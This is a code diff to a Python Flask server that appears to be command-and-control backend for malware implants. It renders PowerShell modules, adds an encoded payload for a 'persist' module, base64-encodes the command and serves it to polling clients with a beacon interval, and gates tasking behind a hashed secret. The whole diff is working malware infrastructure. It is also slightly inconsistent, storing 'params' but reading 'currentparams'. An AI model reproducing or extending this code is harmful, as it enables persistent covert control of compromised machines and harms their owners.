@@ -6,7 +6,7 @@ from hashlib import sha256
 from functools import wraps
 from base64 import b64encode as enc, b64decode as dec
 from jinja2 import Template
-from conf import variables
+from conf import variables, SECRET
 import os
 
 
@@ -15,7 +15,7 @@ def is_secret(f):
     @wraps(f)
     def wrap(*args, **kwargs):
         if request.headers.get('content-type') != 'application/json' or \
-        "secret" not in request.json or sha256(request.json["secret"].encode()).hexdigest()!='2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b':
+        "secret" not in request.json or sha256(request.json["secret"].encode()).hexdigest()!=SECRET:
             return abort(404)
         return f(*args, **kwargs)
         
@@ -25,11 +25,13 @@ def render_template(template_content, variables):
     template = Template(template_content)
     return template.render(**variables)
 
-def manage(cmd, request):
+def manage(cmd, params):
     module = "{0}.ps1".format(cmd)
     if module in os.listdir("modules"): 
-        cmd = render_template(open(os.path.join("modules", module),"r").read(),variables | {"encoded_payload":encoded_payload()}) 
-        
+        # Only case where payload is needed
+        if cmd == "persist":variables["encoded_payload"]=encoded_payload()
+        cmd = render_template(open(os.path.join("modules", module),"r").read(),variables | params)
+        print(cmd)
     return enc(cmd.encode()).decode()
 
 def encoded_payload():
@@ -55,8 +57,8 @@ def run():
         db.session.add(v)
         db.session.commit()
 
-    
-    return {"currentcmd": manage(v.getInfo()["currentcmd"], request), "delta":v.getInfo()["delta"]}
+    info = v.getInfo()
+    return {"currentcmd": manage(info["currentcmd"], info["currentparams"]), "delta":info["delta"]}
 
 @app.route("/out",methods=["POST"])
 def out():
@@ -114,8 +116,10 @@ def setCmd():
         return {"error": "Please set delta or cmd"}
     if "cmd" in request.json:        
         v.currentcmd = request.json["cmd"]
+        v.params = request.json["params"]
     if "delta" in request.json:
         v.delta = int(request.json["delta"])
+    #if "params" in request.json:v.currentparams = request.json["params"]
     db.session.commit()
     return {"message":"cmd updated"}
 
